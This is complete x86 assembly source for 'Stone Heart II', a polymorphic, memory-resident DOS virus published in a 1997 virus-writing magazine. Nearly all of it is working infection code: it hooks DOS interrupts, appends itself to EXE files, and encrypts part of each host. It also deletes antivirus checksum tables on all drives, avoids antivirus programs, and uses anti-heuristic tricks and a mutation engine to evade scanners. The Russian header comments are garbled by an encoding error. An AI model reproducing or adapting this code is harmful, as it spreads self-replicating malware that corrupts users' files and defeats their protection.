
;      ‹‹                  €
;     ﬂﬂﬂ  Virus Magazine  € Box 176, Kiev 210, Ukraine      IV  1997
;     ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ  €ﬂﬂﬂﬂﬂﬂ€
;      ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€    › € ‹ﬂ€ € ‹ﬂﬂ €‹‹   € €  € €
;       € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €    € € € € € €   €     € €  € €
;       € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ     ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹  € €  € €
;       ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  €‹‹‹‹‹‹€
;          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.

;                       Stone Heart II
;
; ê•ß®§•≠‚≠Î© ØÆ´®¨Æ‡‰≠Î© ¢®‡„· Ø•‡•¨•≠≠Æ© §´®≠Î,  ØÆ‡†¶†ÓÈ®© EXE
; ‰†©´Î > 4096 °†©‚.
; ò®‰‡„•‚ Á†·‚Ï ™Æ§† Ø‡Æ£‡†¨¨Î (512 °†©‚ ØÆ·´• ß†£Æ´Æ¢™†), °´†£Æ§†‡Ô
; Á•¨„ ≠• ´•Á®‚·Ô Adinf ®´® TbClean.
; ëÆ§•‡¶®‚ ≠•·™Æ´Ï™Æ Ø‡Æ·‚ÎÂ, ≠Æ Ì‰‰•™‚®¢≠ÎÂ Ø‡®•¨Æ¢ Ø‡Æ‚®¢ Ì¢‡®·‚®™®
; (≠• Æ°≠†‡„¶®¢†•‚·Ô DrWeb, F-Prot, AVP ® ‚.§.). Tbav ®≠Æ£§† ‡„£†•‚·Ô,
; ≠Æ ‡•§™Æ ® ≠• ·®´Ï≠Æ (Æ§®≠-§¢† ‰´†£†).
; ì§†´Ô•‚ Ø‡® ·‚†‡‚• éÅôàÖ ‚†°´®ÊÎ Adinf ≠† ¢·•Â ‡†ß§•´†Â ¢®≠Á•·‚•‡†.
; á†≠®¨†•‚ ¢ Ø†¨Ô‚® Æ™Æ´Æ 5 ä°. ì·Ø•Ë≠Æ ‡†°Æ‚†•‚ ¢ DOS ·•··®® Windows
; 95. ë‚†‡†•‚·Ô ≠• ß†‡†¶†‚Ï †≠‚®¢®‡„·Î.
;
;                                       (c) Eternal Maverick 1997

        .model tiny
        .code
;-------------------------------------------------
vl      equ     offset bytes - start
base    equ     offset endv - start
CrLen   equ     (vl+200h+1)/2
;-------------------------------------------------
start:
;-------------------------------------------------
;       Very lame Anti-heuristic trick!
;       But it works against DrWeb...
;-------------------------------------------------
        mov  ah,62h
        int  21h
        mov  ax,es
        cmp  ax,bx
        je   NoHer
fuck_it:
        cld
        call mist
mist:
        pop  si
        add  si,20h
        push cs
        pop  es
        mov  cx,500h
        rep  stosw
        jmp  short fuck_it
;-------------------------------------------------
NoHer:
        push es
no_es:
        call next
next:
        mov  ah,2Ah
        mov  bx,'EM'    ; Are you there ?
        int  21h
install:
        cmp  bx,'ME'    ; You ask!
        je   restore    ; Already installed...

        pop  si
        push si
        sub  si,offset next - start
        push es
        mov  ax,word ptr ds:[02h]
        sub  ax,(vl/16) + 1
        mov  es,ax
        call remove
        pop  ds
        mov  si,0Ah
        mov  di,offset fail - start + 1
        movsw
        movsw
        mov  word ptr ds:[si-4],offset INT22h - start
        mov  word ptr ds:[si-2],es
        mov  ds,cx
        mov  si,084h
        mov  di,offset old21h - start + 1
        movsw
        movsw
;------------------------------------
;       Adinf tables to kill!
;------------------------------------
; P.S.  Adinf - a nasty bitch,
;       creating checksum tables
;       on every hard disk drive.
;------------------------------------
        call DelTab
mask1   db      'C:\*.*',0
restore:
        pop  si
        pop  dx
        push dx
        add  dx,10h
        push dx

        add  dx,20h
        sub  dx,word ptr cs:[si+offset bytes - next + 08h]
        mov  ax,word ptr cs:[si+offset CodeKey-next]
        mov  ds,dx
        mov  cx,100h
        xor  di,di
Decrypt:
        xor  word ptr ds:[di],ax
        inc  di
        inc  di
        loop Decrypt

        pop  dx
        push cs
        pop  ds
        mov  cx,word ptr ds:[si+offset bytes-next+06h]
        or   cx,cx
        jz   No_Relocation
        mov  bx,word ptr ds:[si+offset bytes-next+18h]
Next_Relo:
        les  di,dword ptr ds:[si+bx+offset bytes-next]
        mov  ax,es
        add  ax,dx
        mov  es,ax
        add  word ptr es:[di],dx
        add  bx,4
        loop Next_Relo
No_Relocation:
        pop  es
        mov  cx,word ptr ds:[si+offset bytes-next]
        mov  cx,dx
        cli
        add  cx,word ptr ds:[si+offset bytes-next+0Eh]
        mov  ss,cx
        mov  sp,word ptr ds:[si+offset bytes-next+10h]
        sti
        add  dx,word ptr ds:[si+offset bytes-next+16h]
        push dx
        push word ptr ds:[si+offset bytes-next+14h]
        push es
        pop  ds
        xor  ax,ax
        xor  bx,bx
        xor  si,si
        xor  di,di
        retf
DelTab:
        pop  di
        push cs
        pop  ds
        mov  ax,3524h
        int  21h
        push es bx
        lea  dx,[di+offset int24h - mask1]
        mov  ah,25h
        int  21h
        mov  ah,2fh
        int  21h
        push es bx
        lea  dx,[di+offset NewBytes - mask1]
        mov  ah,1Ah
        int  21h
        mov  byte ptr ds:[di],'C'
        mov  dx,di
NextDisk:
        push ds dx
        mov  cx,07
        mov  ah,4eh
        int  21h
        jc   NotFound
NextKill:
        mov  ah,2fh
        int  21h
        pop  di
        mov  ax,word ptr ds:[di]
        push di
        push es
        pop  ds
        mov  dl,byte ptr ds:[bx+1Eh+06]
        cmp  dl,al
        jne  NextFile
        mov  word ptr ds:[bx+1bh],ax
        mov  byte ptr ds:[bx+1dh],'\'
        lea  dx,[bx+1bh]
        xor  cx,cx
        mov  ax,4301h
        int  21h
        mov  cl,07
        mov  ah,3ch
        int  21h
NextFile:
        pop  dx ds
        push ds dx
        mov  ah,4fh
        int  21h
        jnc  NextKill
NotFound:
        pop  dx ds
        mov  di,dx
        inc  byte ptr ds:[di]
        cmp  al,12h
        je   NextDisk
        pop  dx ds
        mov  ah,1ah
        int  21h
        pop  dx ds
        mov  ax,2524h
        int  21h
        jmp  restore
remove:
        push cs
        pop  ds
        mov  cx,vl/2
        xor  di,di
        rep  movsw
        ret
set21h:
        cli
        mov  si,084h
        mov  word ptr ds:[si],offset int21h - start
        mov  word ptr ds:[si+2],es
        sti
        ret
int22h:
        mov  ah,48h
        mov  bx,(vl+400h + offset endcode - start)/16 + 1
        int  21h
        jc   fail
        mov  es,ax
        dec  ax
        mov  ds,ax
        xor  si,si
        mov  word ptr ds:[si+1],70h
        call remove
        mov  ds,cx
        call set21h
fail:
        db   0EAh,0,0,0,0
int21h:
        cmp  ah,4bh
        je   check
        cmp  ah,3dh
        je   check
        cmp  ah,43h
        je   check
;----------------------
;  Here I am, Boss!
;----------------------
        cmp  ah,2Ah
        jne  old21h
        cmp  bx,'EM'
        jne  old21h
        xchg bh,bl
        iret
;--------------------------------
old21h: db   0EAh,0,0,0,0
int24h:
        mov  al,3
        iret
check:
;---------------------------------------
;       Check if it is a proper file
;       for infection
;---------------------------------------
        push bp si di es bx cx ax dx ds

        mov  di,dx
        mov  si,di
        push ds
        pop  es
        mov  ax,1211h
        int  2Fh           ; Converts ASCIIZ line into UpCase letters
        cld
        sub  di,4
        mov  ax,'XE'
        scasw
        jne  abort
        scasb
        jne  abort                              ; Not EXE...

        cmp  byte ptr es:[di-5],'F'             ; Adin'F' - ?
        je   abort                              ; Don't touch it.

        sub  di,12      ; 12 = Filename + '.' + Extention

;---------------------
; Check if file name
; contains digits
;---------------------
        mov  si,di
        push es
        pop  ds
        mov  cx,8
isDigit:
        lodsb
        cmp  al,'0'
        jb   noDigit
        cmp  al,'9'
        jbe  abort
noDigit:
        loop isDigit
;---------------------
; Check for antivirus
;         names
;---------------------
        push cs
        pop  ds
        mov  cl,6
ChkThis:
        push cx
        mov  si,offset antiv - start
        mov  cl,6
DoComp:
        cmpsw
        jne  NextStr
        cmpsb
        je   ExitComp
        dec  si
        dec  di
NextStr:
        inc  si
        dec  di
        dec  di
        loop DoComp

        inc  di
        pop  cx
        loop ChkThis
;---------------------
ExitComp:
        or   cx,cx
        jz   Okey       ; Good file

        pop  cx
abort:
        jmp  _esc
Okey:
;---------------------------------------
;       Save & set INT 24h
;---------------------------------------
        mov  ax,3524h
        call INT_21h

        mov  word ptr ds:[base],bx
        mov  word ptr ds:[base+2],es

        mov  ax,2524h
        mov  dx,offset int24h - start
        call INT_21h

;---------------------------------------
;       Turn keyboard off
;---------------------------------------
        in   al,21h
        or   al,00000010b
        out  21h,AL
;---------------------------------------
        pop  ds dx
        push dx ds
        mov  ax,4300h
        call INT_21h

        push cx

        test cl,00000100b       ; System file - ?
        jnz  protect            ; Don't touch it!!!

;----------------------------------------
;       Checking for protected floppy
;       using 3F5h port
;----------------------------------------
        push dx
        mov  cx,400h
        mov  dx,3F5h
        mov  al,4
        out  dx,al
wait_1:
        loop wait_1

        mov  cx,400h
        out  dx,al
wait_2:
        loop wait_2

        in   al,dx
        test al,40h             ; Protected disk - ?
        pop  dx
        jnz  protect
;----------------------------------
        pop  cx
        push cx
        and  cl,0FEh            ; Set READ-ONLY off
        mov  ax,4301h
        call INT_21h
        jnc  FileOk
;-------------------------------
; Not able to change attribute
;-------------------------------
protect:
        pop  cx
        jmp  esc_1
FileOk:
        push dx ds
        mov  ax,3D02h
        call INT_21h            ; DOS Services  ah=function 3Dh
                                ; open file, al=mode,name@ds:dx

        mov  word ptr cs:[base+06h],ax
        mov  ax,5700h
        call FileX              ; DOS Services  ah=function 57h
                                ; get/set file date & time
        push dx cx
        cmp  cl,0Fh             ; Is it already infected?
        je   esc2

        push cs
        pop  ds
        mov  dx,offset Bytes - start
        mov  cx,400h
        call ReadX              ; DOS Services  ah=function 3Fh
                                ; read file, cx=bytes, to ds:dx
        call SeekE

        cmp  ax,1000h           ; File too small to be infected - ?
        jb   esc2

        mov  si,offset Bytes - start
        cmp  word ptr ds:[si],'MZ'
        je   ExeOk
        cmp  word ptr ds:[si],'ZM'
        jne  esc2
ExeOk:
;---------------------------------------
;  Is header longer than 512 bytes ?
;---------------------------------------
        cmp  word ptr ds:[si+8],20h
        ja   esc2
;---------------------------------------
;       Is this EXE segmented ?
;---------------------------------------
        push dx ax
        mov  di,200h
        div  di
        dec  ax
        cmp  ax,word ptr ds:[si+04h]
        pop  ax dx
        jbe  Not_Segmented
esc2:
        jmp  esc_2
;----------------------------------------
Not_Segmented:
        mov  di,offset NewBytes - start
        push ds
        pop  es
        mov  cx,0Ch
        rep  movsw

        mov  cx,10h
        div  cx

        sub  ax,word ptr ds:[si+1024-18h+08h]
        mov  word ptr ds:[si+1024-18h+16h],ax   ; ReloCS
        mov  word ptr ds:[si+1024-18h+14h],dx   ; ExeIP
        mov  word ptr ds:[offset SaveOff - Start],dx
;----------------------------------------
;       Reseting STACK
;----------------------------------------
        add  ax,(vl+200h)/16+1
        mov  word ptr ds:[si+1024-18h+0Eh],ax   ; ReloSS
        add  dx,400h
        and  dl,not 1                           ; To avoid an odd stack
        mov  word ptr ds:[si+1024-18h+10h],dx   ; ReloSP
;----------------------------------------
again:
        in   ax,40h
        or   ax,ax
        jz   again

        mov  word ptr ds:[offset CodeKey - start],ax
        mov  di,offset Bytes - start + 200h
        push di
        mov  cx,100h
Encrypt:
        xor  word ptr ds:[di],ax
        inc  di
        inc  di
        loop Encrypt

        push si
        xor  si,si
        mov  di,cs
        add  di,(offset buffer - start)/16 + 1
        mov  es,di
        call emme11

        pop  si
        push di
        xor  dx,dx
        mov  ax,word ptr ds:[si+1024-18h+02h]
        add  ax,di
        mov  di,200h
        div  di
        add  word ptr ds:[si+1024-18h+04h],ax ; FileSize in 512-byte blocks
        mov  word ptr ds:[si+1024-18h+02h],dx ; Rest of bytes
        mov  word ptr ds:[si+1024-18h+06h],0  ; Set number of relocation
                                              ; table elements to 0

        pop  cx
        push es
        pop  ds
        xor  dx,dx
        call WriteX             ; Write virus body
        push cs
        pop  ds
        call SeekH
        mov  dx,offset NewBytes - start
        call WriteH             ; Write first 18h bytes (header)
        xor  al,al
        mov  dx,200h
        call SeekY
        mov  cx,200h
        pop  dx
        call WriteX
Marker:
        pop  cx
        mov  cl,0Fh             ; Set time to mark infection
        push cx
esc_2:
        pop  cx dx
        mov  ax,5701h
        call FileX              ; DOS Services  ah=function 57h
                                ; get/set file date & time
        mov  ah,3Eh
        call FileX              ; DOS Services  ah=function 3Eh
                                ; close file, bx=file handle
        pop  ds dx cx
        mov  ax,4301h
        call INT_21h            ; DOS Services  ah=function 43h
                                ; get/set file attrb, nam@ds:dx
esc_1:
;-----------------------------
;       Restore int 24h
;-----------------------------
        lds  dx,dword ptr cs:[base]
        mov  ax,2524h
        call INT_21h
;-----------------------------
;       Enable IRQ-1
; User can play with keyboard
;          again.
;-----------------------------
        in   al,21h
        and  al,not 2
        out  21h,al
;-----------------------------
_ESC:
        pop  ds dx ax cx bx es di si bp
        jmp  old21h                             ; No other actions.

        db   'StoneHeart II'                    ; Virus name

ReadX:
        mov  ah,3Fh
        jmp  short FileX
WriteH:
        mov  cx,18h
WriteX:
        mov  ah,40h
        jmp  short FileX
SeekH:
        xor  al,al
        jmp  short SeekX
SeekE:
        mov  al,02
SeekX:
        xor  dx,dx
SeekY:
        xor  cx,cx
SeekZ:
        mov  ah,42h
FileX:
        mov  bx,word ptr cs:[base+06h]  ; File Handle is stored there...
INT_21h:
        pushf
        call dword ptr cs:[offset old21h - start+1]
        ret
CodeKey:
        dw   0                          ; This word is used to crypt
                                        ; a part of file
;-----------------------------------------------------------------
;       These shity programs are too stinky to be even infected
;-----------------------------------------------------------------
ANTIV   db      'AID','AVP','PRO','SCA','EXT','WEB'
;-----------------------------------------------------------------
;        Polymorphic Engine of Stone Heart II
;-----------------------------------------------------------------
Emme11:
        call modulof
modulof:
        pop  bp
        sub  bp,3
;--------------------------------------------------------------------------
;       PARAMETERS:
;       ES - points to buffer of proper size.
;       DS - points to segment of code to be encrypted.
;       SI - offset of code to be crypted.
;       CrLen - number of words (NOT BYTES!!!) to be crypted.
;       SaveOff - delta offset in file (Length + 100h for appending
;                                       COM infector, for example)
;
;       When finished:
;       ÖS:0 - crypted code.
;       DI - its size in bytes.
;--------------------------------------------------------------------------
;       A structure of encryptor:
;       -------------------------
;
;       mov     reg1,offcode    ; offcode - offset of crypted code
;       mov     reg2,-CrLen
;       mov     reg3,code_1
;Decode:
;       oper1   word ptr ds:[reg1],reg3
;       inc     reg1
;       inc     reg1
;       oper2   reg3,code_2
;       inc     reg2
;       jnz     Decode
;
;       --------------------------------
;
;       reg1        - SI,DI,BX or BP
;       reg2,reg3   - AX,BX,CX,DX,BP,SI or DI
;       oper1       - XOR,ADD or SUB
;       oper2       - ADD or SUB
;
;       code_1,code_2 - random numbers
;
;       All unused in decryptor registers are used in garbage instructions.
;--------------------------------------------------------------------------
PolyStart:
        in   al,40h
        or   al,al
        jz   PolyStart

        push si

        xor  di,di

        call makeini

        inc  byte ptr [bp+offset Reg - Emme11]

        lea  si,[bp+offset anti-Emme11]
        mov  cx,05h
ANTI_HER:
        cmp  cl,2
        jne  noGlue
        mov  al,75h
        stosb
        push di
        inc  di
noGlue:
        call make
        movsw
        loop anti_her

        pop  bx
        mov  ax,di
        sub  ax,bx
        dec  ax
        dec  ax
        dec  ax
        mov  byte ptr es:[bx],al

;---------------------------------------------
;       Creating a decryptor
;---------------------------------------------

        call makeini

;---------------------------------------------
;       First instruction
;---------------------------------------------
instr1:
        call ZeroTwo

        mov  al,byte ptr ds:[bx+offset Pack_1-Emme11]
        stosb
        push di         ; Needed for decryptor
        stosw           ; To reserve a place for offset
        mov  al,byte ptr ds:[bx+3+offset Pack_1-Emme11]
        mov  byte ptr ds:[si+1],al
        mov  al,byte ptr ds:[bx+6+offset Pack_1-Emme11]
        mov  ah,al
        mov  word ptr ds:[si+2],ax
        sub  al,40h
        mov  bl,al
        call _fill      ; Make a register busy
        call make
;-----------------------------------------------
;       Second instruction
;-----------------------------------------------
instr2:
        call f_reg
        in   ax,40h
        and  ax,0Fh
        add  ax,CrLen
        add  bl,48h
        mov  byte ptr ds:[si+7],bl

        stosw

        call make
;------------------------------------------------
;       Third instruction
;------------------------------------------------
instr3:
        call f_reg

        mov  byte ptr ds:[si+5],bl

        mov  al,8
        mul  bl
        add  byte ptr ds:[si+1],al
        in   ax,40h
        add  ax,di
        stosw
        push di
        mov  word ptr ds:[bp+offset encryptor - Emme11 - 3],ax
        call make
;--------------------------------------------------
;       To choose operations
;--------------------------------------------------
        call ZeroTwo

        mov  al,byte ptr ds:[offset mirror1 - Emme11 + bx]
        mov  byte ptr ds:[si],al
        sub  bx,bp
        neg  bx
        add  bx,bp
        mov  al,byte ptr ds:[offset mirror1 - Emme11 + bx + 2]
        mov  byte ptr ds:[bp+offset encryptor-Emme11+2],al

        call rnd

        and  bl,1
        add  bx,bp
        mov  al,byte ptr ds:[offset mirror2 - Emme11 + bx]
        add  byte ptr ds:[si+5],al
        add  al,3
        mov  byte ptr ds:[bp+offset encryptor-Emme11+6],al

;-----------------------------------------------------
;       To copy rest of decryptor
;-----------------------------------------------------
        movsw
        call make
        movsb
        call make
        movsb
        call make
        movsw
        in   al,40h
        mov  byte ptr ds:[bp+offset encryptor - Emme11 + 7],al
        stosb
        inc  si
        call make
        movsw
        mov  ax,0FFh
        sub  ax,di
        pop  bx
        add  ax,bx      ; BYTE for JNZ instruction
        stosb
        call make

        pop  si
        mov  ax,word ptr ds:[SaveOff]
        add  ax,di
        mov  word ptr es:[si],ax        ; Offset of crypted code


        mov  cx,CrLen
        mov  bx,0FFFFh
        pop  si
encryptor:
        movsw
        xor  word ptr es:[di-2],bx
        sub  bx,0
        loop encryptor

        ret

makeini:
        mov  byte ptr ds:[bp+offset Reg - Emme11],10h
make:
;-----------------------
; Makes from 1 up to 8
; bytes of garbage code
;-----------------------
        in   ax,40h
        and  ax,00000111b
        inc  ax         ; Number of bytes
        mov  dx,ax
poly:
        push dx
;------------------------------------
;       Generate 1-byte command
;------------------------------------
form_1:
        call rnd

        add  bx,bp
        mov  al,byte ptr ds:[bx+offset data_1-Emme11]
good_1:
        stosb
        dec  dx
form_2:
;-------------------------------------
;       Generate 2-bytes command
;-------------------------------------
        cmp  dx,2
        jb   PolyStop

        call rnd
        call _free
        jnz  form_3

        mov  al,8
        mul  bl
        add  al,0C0h
        push ax
        call rnd
        pop  ax
        add  al,bl
        xchg ah,al

        add  bx,bp
        mov  al,byte ptr ds:[bx+offset data_2-Emme11]
        stosw
        dec  dx
        dec  dx
form_3:
;-------------------------------------
;       Generate 3-bytes command
;-------------------------------------
        cmp  dx,3
        jb   PolyStop

        call _form
        jnz  form_4
        mov  al,83h
        stosw
        in   al,40h
        stosb
        sub dx,3
form_4:
;-------------------------------------
;       Generate 4-bytes command
;-------------------------------------
        cmp  dx,4
        jb   PolyStop

        call _form
        jnz  PolyStop
        mov  al,81h
        stosw
        in   ax,40h
        xor  ax,di
        stosw
        sub  dx,4
PolyStop:
        or   dx,dx
        jnz  form_1

        pop  dx

        ret

ZeroTwo:
        call rnd
        mov  ax,bx
        mov  bl,3
        div  bl
        mov  bl,ah
        add  bx,bp
        ret

;-----------------------------------------------------------------
Reg     db      10h     ; This byte is to mark registers
                        ; involved in decryptor.
                        ; 10h means don't use SP as a garbage
                        ; register ;)
;-----------------------------------------------------------------
;       Data for polymorphic engine
;-----------------------------------------------------------------
        data_1   db  0f5h,0f8h,0f9h,0fbh,0fch,0fdh,09eh,090h
        data_2   db  03h,0bh,013h,01bh,023h,02bh,033h,085h
pack_1:
        mov_reg1 db  0beh,0bfh,0bbh
        xor_reg1 db  04h,05h,07h
        inc_reg1 db  046h,047h,043h
operations:
        mirror1  db  01h,031h,029h
        mirror2  db  0c0h,0e8h
;---------------------------------------------------------------------
db      'EMME Small 1.1'     ; Small Eternal Maverick Mutation Engine
;---------------------------------------------------------------------
_form   proc near
        call rnd
        and  al,03Fh
        add  al,0C0h
        xchg al,ah
_free:
        push bx
        push cx
        mov  cl,bl
        mov  bl,1
        shl  bl,cl
        test byte ptr ds:[bp+offset Reg-Emme11],bl
        jmp  short popcxbx
f_reg:
        call rnd
        call _free
        jnz  f_reg
        mov  al,0B8h
        add  al,bl
        stosb
_fill:
        push bx
        push cx
        mov  cl,bl
        mov  bl,1
        shl  bl,cl
        add  byte ptr ds:[bp+offset Reg-Emme11],bl
popcxbx:
        pop  cx
        pop  bx
        ret
_form   endp

rnd:
;---------------------------
; A bad way for getting a
; random number
;---------------------------
        push dx
        in   ax,[40h]
        add  ax,word ptr ds:[bp+offset Seed-Emme11]
        mov  dx,25173
        mul  dx
        add  ax,13849
        pop  dx
        mov  word ptr ds:[bp+offset Seed-Emme11],ax
        xor  ax,word ptr ds:[bp+offset ForXor-Emme11]
        mov  bx,ax
        and  bx,7
        ret

Seed    dw   37849
ForXor  dw   559

;--------------------------------
; Built-in anti-heuristic,
; bad against DrWeb, but good
; againt some other antiviruses
;--------------------------------
anti:
        xor  ax,ax
        in   ax,40h
        or   ax,ax
        int  20h
        push cs
        pop  ds
;--------------------------------
;       Cryptor Pattern
;--------------------------------
Pattern:
        xor word ptr ds:[di],bx
        inc di
        inc di
        sub bx,0
        inc cx
        jnz Pattern
;----------------------------------------
;       End of Polymorphic Engine
;----------------------------------------
bytes:
;----------------------------------------
;       Victim file header
;----------------------------------------
        db   10h dup (0)
        dw   offset vstack
        dw   0
        dw   offset endv
        db   2 dup (0)
;-----------------------------------------------------------------
        db   400h-18h dup (0)   ; Rest of files' first 1024 bytes
;-----------------------------------------------------------------
NewBytes:
        db   18h dup (0)        ; New header for infected file
endcode:
        db   10h dup (0)
buffer:
        db   0900h dup (0)      ; Buffer for crypting
SaveOff dw   0                  ; Used in polymorphic engine
endv:
        mov  ah,4ch
        int  21h
.stack
        dw   16 dup (0)
vstack:
        end  start